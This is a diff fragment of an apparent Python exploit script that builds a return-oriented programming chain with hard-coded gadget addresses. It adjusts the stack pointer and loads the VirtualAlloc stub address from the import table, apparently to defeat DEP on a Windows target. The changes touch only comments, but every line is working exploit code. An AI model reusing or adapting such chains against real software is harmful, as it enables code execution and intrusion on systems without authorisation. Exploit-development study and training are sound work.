@@ -38,11 +38,11 @@ push1 = b"AAAA"             # makeup for 1 pop
 rop2 = p32(0x505115a3)      # pop ecx ; ret  ;
 value1 = p32(0xffffffe4)    # -0x1c (28 bytes back)
 rop3 = p32(0x5051579a)      # add eax, ecx ; ret  ;
-rop4 = p32(0x5050118d)      # push eax ; mov eax, esi ; pop esi ; ret  ;
+rop4 = p32(0x5050118d)      # push eax ; mov eax, esi ; pop esi ; ret  ;   correct esp in esi
 
 # Set VirtualAllocStub address 
 rop5 = p32(0x5053a0f5)      # pop eax ; ret  ;
-value2 = p32(0x5054a221)    # VirtualAllocStub address + 1
+value2 = p32(0x5054a221)    # VirtualAllocStub address in IAT + 1
 rop6 = p32(0x505115a3)      # pop ecx ; ret  ; 
 value3 = p32(0xffffffff)    # -1
 rop7 = p32(0x5051579a)      # add eax, ecx ; ret  ;
